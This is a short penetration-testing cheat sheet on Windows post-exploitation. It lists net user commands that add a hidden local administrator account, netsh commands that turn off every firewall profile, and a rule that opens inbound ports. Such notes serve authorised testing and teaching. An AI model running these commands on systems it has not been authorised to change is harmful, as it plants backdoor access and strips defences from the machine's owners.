# Windows - Post-Exploit

### Add local Administrator

The net user commands can be used to create and add a windows account in the
administrator group:

```
# Create a new account
net user /add <USERNAME> <PASSWORD>

# Add account as administrator
net localgroup Administrators <USERNAME> /add
net localgroup Administrateurs <USERNAME> /add
```

### Manage Windows Firewall

To check whether the Windows Firewall is enabled on a server or computer,
the following command can be used as Administrator/SYSTEM:

```bash
netsh advfirewall show allprofiles
```

By default, three separate listings are present: Domain profile settings,
private profile settings and public profile settings.  
With the private profile, applied to a network adapter when it is connected
to a network that is identified by the user or administrator as a private
network, Windows enables network discovery features, allows file sharing and
other networked features.   
The public profile, applied to a network adapter by default or if specified so
by an user or administrator, is the most restrictive profile. In the default
public profile, Windows will block all inbound connections to programs that are
not on the list of allowed programs.   
Finally, the Domain profile is used when a server or computer is joined to an
Active Directory domain. In this environment, firewall settings are typically
(but not necessarily) controlled by a network administrator.

To disable the firewall use the following commands:

```
# Disable current profile
netsh advfirewall set currentprofile state off

# Disable all profiles
netsh advfirewall set allprofiles state off

# Disable the private, public and domain profiles
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set domainprofile state off
```

To open a specific port, or a range, use the following command:

```
netsh advfirewall firewall add rule name="<RULE_NAME" protocol=TCP dir=in localport=<PORT> action=allow
```
